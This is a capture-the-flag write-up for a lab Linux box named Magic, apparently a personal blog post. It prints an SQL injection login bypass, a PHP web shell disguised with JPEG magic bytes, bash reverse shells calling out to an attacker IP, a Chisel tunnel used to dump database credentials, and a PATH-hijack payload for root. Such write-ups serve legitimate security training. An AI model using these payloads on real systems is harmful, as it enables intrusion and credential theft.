+++
date = '2026-09-06T20:37:25+02:00'
draft = false
title = 'Magic Writeup EN'
+++
**Author:** **`joy.scd01`**

**Date:** **`08/03/2025`**

![pwn.png](/images/imgs_magic/pwn.png)

---
# Introduction

_**Magic**_ is a **Medium-level Linux box** that highlights the importance of input validation and secure file upload handling. 

In this scenario, initial access is gained by bypassing a login form via **SQL Injection**, followed by an **Arbitrary File Upload** using a **Magic Bytes** manipulation technique to upload a **PHP** web shell. 

Lateral movement involves pivoting to an internal database using **Chisel** for port forwarding to extract user credentials. Finally, the privilege escalation is achieved by exploiting a **SUID** binary vulnerable to **PATH Hijacking**, leading to a full system compromise.

---
# Techniques Used

- **Authentication Bypass (SQL Injection)**
- **Arbitrary File Upload (Magic Bytes Bypass) → RCE**
- **Local Port Forwarding (Chisel) → Database Dump**
- **SUID Binary Exploitation → PATH Hijacking**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV magic
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## HTTP - Web Enumeration

Browsing to port 80, It was hosted a "**Magic Portfolio**" webpage.

![web1.png](/images/imgs_magic/web1.png)

There wasn't much functionality exposed except for a **login** form at the bottom left of the page. While analyzing the web application, I ran a **gobuster** scan against directories and a **ffuf** scan for vhosts in the background.

![login.png](/images/imgs_magic/login.png)

I started testing the login form with simple combinations of username:password and basic **SQLi** payloads. Initially, nothing worked. By changing the **`type="password"`** attribute in the **HTML** to **`type="text"`** to see what was being typed, I noticed that the frontend was blocking the input of space characters.

To bypass this client-side restriction, I fired up **Burp Suite**, intercepted the login request, and injected a **URL-encoded SQLi** payload directly into the password field: **`'+OR+1%3d1--+-`**.

The injection was successful, and I logged into the application.

---
# Initial Access | File Upload Bypass → www-data

Post-login, I was presented with an image upload form.

I attempted to upload a basic **PHP web shell** named **`ci.php`**:

```php
<?php system($_REQUEST['cmd']) ?>
```

The application threw an error: 
- **`"Sorry, only JPG, JPEG & PNG files are allowed."`**

![burp1.png](/images/imgs_magic/burp1.png)

I tried bypassing the extension filter by appending **`.jpg`** to my file (**`ci.php.jpg`**). This triggered a different error:
- **`"What are you trying to do there?".`**

![burp2.png](/images/imgs_magic/burp2.png)

Changing the **`Content-Type`** in the **HTTP** request to **`image/jpg`** yielded the same failure.

**Note**: _At this point, it was clear the application was inspecting the file content, likely checking the "**Magic Bytes**" (**file signatures**) at the beginning of the file to verify its actual type. Since the machine is named "**Magic**", this was a solid hint._

To bypass this, I needed to spoof a valid **JPEG** header. I took a legitimate **`sample.jpg`** file and retrieved its first **20** bytes using **`xxd`**:

```bash
head -c 20 sample.jpg | xxd
```

I then prepended those specific **JPEG magic bytes** (**`ffd8ffe000104a464946000101010048`**) to my **PHP** payload and saved it as **`ci.php.jpg`**:

```bash
echo 'ffd8ffe000104a464946000101010048' | xxd -p -r > ci.php.jpg
cat ci.php >> ci.php.jpg
```

![magic.png](/images/imgs_magic/magic.png)

Uploading this newly crafted file was successful.

![upload.png](/images/imgs_magic/upload.png)

Now, I needed to find where the uploads were stored. My previous **gobuster** scans had found a **`/images`** directory (which returned a **302 Forbidden**). I ran another targeted gobuster scan against the **`/images`** directory and found **`/images/uploads`**.

Navigating to my uploaded file confirmed code execution:

```text
http://magic/images/uploads/ci.php.jpg?cmd=id
```

![ce.png](/images/imgs_magic/ce.png)

I set up a **netcat** listener and sent a **URL-encoded** bash reverse shell payload:

```text
http://magic/images/uploads/ci.php.jpg?cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261%27
```

![initial.png](/images/imgs_magic/initial.png)

I caught the reverse shell as **`www-data`**.

---
# Lateral Movement | Chisel & Database Dump → theseus

While exploring the filesystem as **`www-data`**, I found a database configuration file inside the **`/var/www/Magic`** directory containing credentials.

![lateral1.png](/images/imgs_magic/lateral1.png)

I attempted to use these credentials to switch directly to the user **`theseus`** via su, but authentication failed. 

![lateral_fail.png](/images/imgs_magic/lateral_fail.png)

My next logical step was to connect to the database to enumerate other tables or hashes. However, neither **mysql** nor **sqlite3** clients were installed on the target machine.

![dbfail.png](/images/imgs_magic/dbfail.png)

To bypass this restriction and tunnel the internal port (**`3306`**) directly to my machine, I transferred the **Chisel** binary to the target and set up a reverse tunnel.

On my attacker machine (**`server`**):

```bash
chisel server -p 8000 --reverse
```

On the target machine (**`client`**):

```bash
./chisel client 10.10.15.152:8000 R:3306:127.0.0.1:3306
```

With the tunnel established, I connected to the database using my local **MySQL** client:

```bash
mysql -h 127.0.0.1 -P 3306 -u theseus -p
```

![db1.png](/images/imgs_magic/db1.png)

I successfully authenticated, dumped the login table inside the **Magic** database, and retrieved the correct password for **`theseus`**.

```SQL
show databases;
use Magic;
show tables;
select * from login;
```

![db2.png](/images/imgs_magic/db2.png)

I tried connecting via **SSH** using the new password, but the server only accepted public key authentication. 

![sshfail.png](/images/imgs_magic/sshfail.png)

To bypass this, I switched user (**`su theseus`**) directly from my existing **`www-data`** shell. Once logged in as **`theseus`**, I grabbed the **user flag**, added my public **SSH key** to the **`/home/theseus/.ssh/authorized_keys`** file, and secured a stable **SSH** session.

![userf.png](/images/imgs_magic/userf.png)

---
# Privilege Escalation | SUID Binary → PATH Hijacking → root

I started my manual internal enumeration by searching for binaries with the **SUID** bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid.png](/images/imgs_magic/suid.png)

This identified an unusual binary: **`/bin/sysinfo`**.

I searched **GTFOBins** and online repositories, but it appeared to be a custom executable. To understand what it was doing under the hood, I analyzed it at the **binary level** using **`strings`**:

```bash
strings /bin/sysinfo
```

![strings.png](/images/imgs_magic/strings.png)

The output revealed that the binary was calling system commands like **`fdisk`**, **`cat`**, **`free`**, etc. without specifying their absolute paths (calling **`fdisk`** instead of **`/sbin/fdisk`**).

**Note**: _If a binary calls an executable without specifying its **absolute path**, the system searches for it by checking the directories listed in the **`$PATH`** environment variable in order, from left to right. By prepending our own directory (like **`/tmp`**) to the **`$PATH`** and placing a malicious executable named exactly like the requested command inside it, the system will execute our payload instead of the legitimate binary._

To weaponize this **PATH Hijacking** vulnerability, I navigated to the **`/tmp`** directory and modified my environment variable:

```bash
export PATH=/tmp:$PATH
```

![hijack.png](/images/imgs_magic/hijack.png)

Checking **`echo $PATH`** confirmed that **`/tmp`** was now the first directory in the path string.
Next, I created a malicious file named **`fdisk`** containing a reverse shell payload:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.152/22667 0>&1'
```

I made it executable (**`chmod +x fdisk`**), set up a **netcat** listener on my attacker machine, and executed the **SUID** binary:

```bash
sysinfo
```

The binary attempted to call **`fdisk`** as **root**, hit my malicious script in **`/tmp`** first, and executed the reverse shell.

![rootf.png](/images/imgs_magic/rootf.png)

I successfully obtained a **root shell**. The **root flag** was located in **`/root`**.

---
# Final Thoughts

A great box that focuses on techniques you don't see every day, but that are 100% realistic and essential to know. Bypassing file upload restrictions via **Magic Bytes** spoofing is a classic real-world scenario, as many web applications rely on file signatures rather than just extensions. The lateral movement with **Chisel** was a nice touch, and the privilege escalation via **PATH Hijacking** on a SUID binary is a textbook misconfiguration.